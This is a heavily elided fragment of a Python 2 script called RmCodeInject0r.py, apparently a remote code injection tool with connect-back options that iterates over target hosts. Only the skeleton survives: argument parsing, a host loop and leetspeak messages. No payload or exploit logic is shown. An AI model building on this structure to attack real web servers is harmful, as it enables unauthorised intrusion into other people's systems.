...
def s3nd_sh1t(args, m0de, c0nn_b4ck):
    ...
    try:
        ...
        if res == 0:
            ...
            if args.v:
                print "--> no web server 0n %s" % (args.h)
    except socket.error:
        return
    return
...
def parse_args():
    ...
    usage='\n\n  ./RmCodeInject0r.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\
            '\n  ./RmCodeInject0r.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',
    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
    opts = p.add_argument_group('0pt1ons', '')
    opts.add_argument('-h', metavar='ClaY TeaM',
        ...
        if args.i:
            ...
            for h0st in h0sts:
                try:
                    ...
                    sys.stdout.flush()
                    sys.stdout.write("\b\b[!] warning: ab0rt3d bY us3r\n")
                    raise SystemExit
...
def m41n():
    if  __name__ == "__main__":
        print "--==[RmCodeInject0r.py ]==--"
        c0ntr0ller()
    else:
        print "[-] error: y0u fucked up dude"
        sys.exit(1)
